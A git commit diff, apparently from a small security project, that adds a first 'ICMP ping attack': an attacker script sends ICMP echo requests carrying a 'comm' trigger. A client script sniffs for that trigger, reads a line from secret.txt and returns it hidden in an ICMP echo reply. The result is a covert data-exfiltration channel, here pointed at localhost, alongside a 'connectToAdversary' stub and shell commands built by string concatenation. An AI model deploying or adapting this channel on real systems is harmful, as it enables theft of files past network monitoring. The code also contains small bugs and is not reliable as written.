f355ac56df441e2bffd7b3c49985b4fcf66e2e64
Jonathan Hsu <jhsu0903@hotmail.com>
2022-12-04 20:01:17 -0500

    First implementation of ICMP ping attack

--- attack/attack.py
+++ attack/attack.py
@@ -9,6 +9,20 @@ from scapy.layers.inet import ICMP, IP
 
 def sendPing():
     ip = 'localhost'
-    send(IP(dst = ip, src = 'localhost') / ICMP(type = 8) / (b"put data here") )
+    packet = IP(dst = ip, src = 'localhost') / ICMP(type = 8) / (b"comm")
+    packet.show2()
+    send(packet)
 
-sendPing()
+def processPacket(packet):
+    if packet[ICMP].type == 0:
+        if Raw in packet:
+            packet.show()
+            data = packet[Raw].load().decode()
+            print(data)
+
+while True:
+    sendPing()
+    sniff(iface='\\Device\\NPF_Loopback', prn=processPacket, filter="icmp")
+
+    waitTime = 5
+    time.sleep(waitTime)
--- client/client.py
+++ client/client.py
@@ -4,7 +4,7 @@ import os
 import random
 import requests
 from scapy.all import *
-from scapy.layers.inet import ICMP
+from scapy.layers.inet import ICMP, IP
 
 
 def connectToAdversary():
@@ -25,37 +25,50 @@ def connectToAdversary():
             print(data.decode())
             data = conn.recv(1024)
 
+
 def sendGetRequest():
     address = 'localhost'
-    r = requests.get(url = address)
+    r = requests.get(url=address)
+
 
 def sendPostRequest():
     address = 'localhost'
     data = ''
-    r = requests.post(url = address, data = data)
+    r = requests.post(url=address, data=data)
+
 
 def sendICMPPing():
     address = 'localhost'
     response = os.system("ping -c 1 " + address)
+
 
 def dnsARecord():
     address = 'localhost'
     site = 'example.com'
     os.system('dig @' + address + ' ' + site)
 
+
 def processPacket(packet):
-    if ICMP in packet:
+    if packet[ICMP].type == 8:
         if Raw in packet:
             data = packet[Raw].load.decode()
-            if 'put data here' in data:
-                #send a file
-                return
+            if 'comm' in data:
+                packet.show()
+                # send a file
+                with open('secret.txt') as f:
+                    string = f.readline()
+                time.sleep(3)
+                send(IP(dst='localhost', src='localhost') / ICMP(type=0) / string.encode())
+
 
 def sniffForPacket():
-    interface = ''
-    sniff(iface= interface, prn= processPacket(), filter='icmp')
+    interface = '\\Device\\NPF_Loopback'
+    sniff(iface=interface, prn=processPacket, filter='icmp')
 
-functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]
+
+# functionList = [connectToAdversary(), sendGetRequest(), sendPostRequest(), sendICMPPing(), dnsARecord()]
+
+functionList = [sendICMPPing()]
 
 while True:
     sniffForPacket()
@@ -64,5 +77,3 @@ while True:
     time.sleep(waitTime)
 
     random.choice(functionList)
-
-
